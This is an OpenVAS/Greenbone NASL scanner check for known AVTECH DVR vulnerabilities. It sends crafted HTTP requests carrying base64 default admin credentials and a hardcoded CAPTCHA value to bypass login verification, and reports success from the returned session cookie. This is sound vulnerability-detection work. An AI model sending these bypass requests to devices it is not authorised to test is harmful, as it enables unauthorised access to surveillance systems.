# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803768");
  script_version("2023-11-02T05:05:26+0000");
  script_cve_id("CVE-2013-4980", "CVE-2013-4981", "CVE-2013-4982");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:C");
  script_tag(name:"last_modification", value:"2023-11-02 05:05:26 +0000 (Thu, 02 Nov 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-01-15 14:39:00 +0000 (Wed, 15 Jan 2020)");
  script_tag(name:"creation_date", value:"2013-10-07 16:31:24 +0530 (Mon, 07 Oct 2013)");
  script_name("AVTECH DVR Multiple Vulnerabilities");

  script_tag(name:"summary", value:"AVTECH DVR is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send crafted HTTP GET request and check it is possible bypass the captcha
verification or not.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - The device sending 10 hardcoded CAPTCHA requests after an initial
   purposefully false CAPTCHA request.

  - An user-supplied input is not properly validated when handling RTSP
   transactions.

  - An user-supplied input is not properly validated when handling input
   passed via the 'Network.SMTP.Receivers' parameter to the
   /cgi-bin/user/Config.cgi script.");

  script_tag(name:"affected", value:"DVR 4CH H.264 (AVTECH AVN801) firmware 1017-1003-1009-1003");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to bypass CAPTCHA
requests, cause a buffer overflow resulting in a denial of service or
potentially allowing the execution of arbitrary code.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/27942");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/62033");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/62035");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/62037");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2013/Aug/284");
  script_xref(name:"URL", value:"http://www.coresecurity.com/advisories/avtech-dvr-multiple-vulnerabilities");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Avtech/banner");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

dvrPort = http_get_port(default:80);
banner = http_get_remote_headers(port:dvrPort);
if(!banner || banner !~ "Server:.*Avtech"){
  exit(0);
}

host = http_host_name(port:dvrPort);

req = 'GET //cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4' +
      '=&captcha_code=FMUA&verify_code=FMUYyLOivRpgc HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n\r\n';

result = http_send_recv(port:dvrPort, data:req);
if("ERROR: Verify Code is incorrect" >< result)
{

 req = 'GET //cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4' +
       '=&captcha_code=FMUF&verify_code=FMUYyLOivRpgc HTTP/1.1\r\n' +
       'Host: ' + host + '\r\n\r\n';
 result = http_send_recv(port:dvrPort, data:req);

 if("0 OK" >< result &&  result =~ "Set-Cookie: SSID.*path" &&
    "ERROR: Verify Code is incorrect" >!< result)
 {
   security_message(port:dvrPort);
   exit(0);
 }
}
